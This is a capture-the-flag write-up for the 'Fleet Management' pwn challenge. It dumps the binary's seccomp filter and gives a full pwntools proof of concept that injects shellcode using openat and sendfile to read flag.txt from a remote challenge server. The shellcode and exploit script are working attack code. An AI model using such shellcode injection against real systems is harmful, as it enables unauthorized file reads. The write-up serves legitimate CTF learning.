# Fleet Management

```
score: 300
solved: **
difficulty: easy
tags: pwn, shellcode
```

## Identify
Have `hidden option` as 9: Seccomp will be setuped and run a shellcode. Using `seccomp-tools` to dump:
```bash
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 0011
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x06 0xffffffff  if (A != 0xffffffff) goto 0011
 0005: 0x15 0x04 0x00 0x0000000f  if (A == rt_sigreturn) goto 0010
 0006: 0x15 0x03 0x00 0x00000028  if (A == sendfile) goto 0010
 0007: 0x15 0x02 0x00 0x0000003c  if (A == exit) goto 0010
 0008: 0x15 0x01 0x00 0x000000e7  if (A == exit_group) goto 0010
 0009: 0x15 0x00 0x01 0x00000101  if (A != openat) goto 0011
 0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0011: 0x06 0x00 0x00 0x00000000  return KILL
```
It means only allow `openat` and `sendfile` syscalls.
## Exploit
We will write a shellcode flowing: 
```
tmp = openat(AT_FDCWD, "flag.txt", O_RDONLY)
sendfile(fd_output,tmp,0,size)
```
<mark>**Note:**</mark> Standard output is `1` but in server we have to brute-force from `4`.\
POC:
```python
from pwn import *
import time

s = '''
init-gef
b beta_feature
'''

context.binary = "./fleet_management"

def run():
    # p = process("./fleet_management")
    p = remote("157.245.40.139",32657)
    # gdb.attach(p, gdbscript=s)
    # time.sleep(2)

    p.sendafter(b"do? ", b"9\n")
    time.sleep(0.5)
    payload = b""
    shell = shellcraft.amd64
    sh = ""
    sh += "sub rsp, 0x10\n"
    sh += shell.pushstr(b"flag.txt")
    sh += shell.linux.syscall("SYS_openat", 0xFFFFFF9C, "rsp", 4)
    sh += '''push 0x20
    pop r10
    mov rsi, rax
    push 0x28
    pop rax
    push 5
    pop rdi
    xor rdx, rdx
    syscall\n'''
    print(sh)
    payload += asm(sh.rstrip())
    payload = payload.rjust(60,b"\x90")
    p.send(payload+b"\n")
    time.sleep(0.5)
    p.interactive()

def main():
    tmp = run()

if __name__ == "__main__":
    main()
```